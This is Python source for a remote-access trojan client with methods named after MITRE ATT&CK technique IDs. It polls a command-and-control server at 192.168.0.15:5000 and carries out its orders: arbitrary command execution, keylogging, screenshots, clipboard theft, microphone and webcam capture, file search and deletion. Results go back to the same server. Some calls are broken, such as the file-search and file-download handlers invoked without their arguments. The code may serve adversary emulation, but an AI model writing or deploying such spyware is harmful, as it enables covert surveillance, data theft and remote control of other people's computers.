import os, subprocess,requests, socket, io, pyaudio, wave
from PIL import ImageGrab
from pynput import keyboard
from time import sleep
from datetime import datetime
from platform import uname
import base64

class Client:
    def __init__(self, os_platf:str):
        self.os_platf = os_platf.lower()
    def t_1082(self):
        if self.os_platf=='windows':
            return subprocess.run(['systeminfo'], capture_output=True).stdout.decode()
        elif self.os_platf=='linux':
            res = subprocess.run('uname -a'.split(), capture_output=True).stdout.decode()
            res += subprocess.run('ip addr'.split(), capture_output=True).stdout.decode()
            res += subprocess.run(['lsblk'], capture_output=True).stdout.decode()
            res += subprocess.run(['lsusb'], capture_output=True).stdout.decode()
            return res
        
    def t_1059(self, command:str):
        return subprocess.run(command.split(),capture_output=True).stdout.decode()

    def t_1083(self, filename):
        if self.os_platf=='windows':
            disks = subprocess.run(["wmic","logicaldisk","get","caption"])
            if not disks:
                return -1
            for v in str(disks, "utf-8").split()[1:]:    
                for dirpath, path, files in os.walk(v+'\\'):
                    if not files:
                        continue
                    for one_file in files:
                        if one_file==filename:
                            return f'File - {dirpath+one_file}'
                        elif path==filename:
                            return f'Directory - {dirpath+path}'
        elif self.os_platf=='linux':  
            for dirpath, path, files in os.walk('/'):
                if not files:
                    continue
                for one_file in files:
                    if one_file==filename:
                        return f'File - {dirpath+one_file}'
                    elif path==filename:
                        return f'Directory - {dirpath+path}'
        return "Not Found"
        
    def t_1107(self, filepath):
        try:
            os.remove(filepath)
            return 'ok'
        except:
            return 'not ok'
    
    def t_1057(self):
        if self.os_platf=='windows':
            return subprocess.run(['tasklist'],capture_output=True).stdout.decode()
        elif self.os_platf=='linux':
            return subprocess.run(['ps','aux'],capture_output=True).stdout.decode()

    def t_1115(self):
        if self.os_platf=='windows':
            return subprocess.run(['powershell.exe','-c','Get-Clipboard'], capture_output=True).stdout.decode()
        elif self.os_platf=='linux':
            return subprocess.run(['xclip','-out'], capture_output=True).stdout.decode()
        
    def t_1113(self):
        screenshot = ImageGrab.grab()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        return base64.b64encode(img_byte_arr.getvalue())

    def t_1056(self, t):
        chars = ''
        def on_press(key):
            nonlocal chars
            try:
                chars = chars+key.char
            except:
                chars = chars + str(key)
        listener = keyboard.Listener(on_press=on_press, on_release=None)
        listener.start()
        while True:
            sleep(int(t))
            break
        
        return chars

    def t_1123(self, t):
        t = int(t)
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        RECORD_SECONDS = t
        data = io.BytesIO()
        with wave.open(data, 'wb') as wf:
            p = pyaudio.PyAudio()
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True)
            for _ in range(0, RATE // CHUNK * RECORD_SECONDS):
                wf.writeframes(stream.read(CHUNK))
            stream.close()
            p.terminate()
        return base64.b64encode(data.getvalue())
    
    def t_1125(self):
        if self.os_platf=='windows':
            command = 'cmd.exe /c winget install 9wzdncrfjbbg --accept-source-agreements --accept-package-agreements'
            subprocess.run(command.split())
            subprocess.run('cmd.exe /c start microsoft.windows.camera:'.split())
            sleep(5)
            screen = self.t_1113()
            subprocess.run('powershell.exe -c Stop-Process -Name "WindowsCamera" -Force'.split())
            return screen
        
        elif self.os_platf=='linux':
            return 'NOT IMPLEMENTED!'
    
    def t_1105(self, data):
        with open(f'{datetime.now().timestamp()}', 'wb') as fl:
            fl.write(data)
        return ''

def main(ip):
    client = Client(uname().system)
    while True:
        while True:
            try:
                requests.post('http://192.168.0.15:5000/is_ok', data={"ip":ip})
                break
            except:
                print("Not connection!")
                sleep(5)

        while True:
            res = ''
            req_control_data = requests.get(f'http://192.168.0.15:5000/get_tactic/{ip}')
            if req_control_data.status_code==404:
                print("Not command!")
                sleep(5)
            else:
                break
        req_control_data = req_control_data.json()
        if req_control_data['tactic'] == 'T1082':
            res = client.t_1082()
        elif req_control_data['tactic'] == 'T1059':
            res = client.t_1059(req_control_data['add_data'])
        elif req_control_data['tactic'] == 'T1083':
            res = client.t_1083()
        elif req_control_data['tactic'] == 'T1105':
        
            data = requests.get(f'http://192.168.0.15:5000/get_files?file={req_control_data['add_data']}')
            if data.status_code==200:
                res = client.t_1105()
            else:
                res = 'no data'
        
        elif req_control_data['tactic'] == 'T1057':
            res = client.t_1057()

        elif req_control_data['tactic'] == 'T1115':
            res = client.t_1115()

        elif req_control_data['tactic'] == 'T1113':
            res = client.t_1113()

        elif req_control_data['tactic'] == 'T1056':
            res = client.t_1056(req_control_data['add_data']) 

        elif req_control_data['tactic'] == 'T1107':
            res = client.t_1107(req_control_data['add_data']) 

        elif req_control_data['tactic'] == 'T1123':
            res = client.t_1123(req_control_data['add_data']) 

        elif req_control_data['tactic'] == 'T1125':
            res = client.t_1125()

        requests.post('http://192.168.0.15:5000/results.html', data={"ip":ip, "tactic":req_control_data['tactic'], "data":res})


if __name__=="__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect(('8.8.8.8',80))
    ip = sock.getsockname()[0]
    main(ip)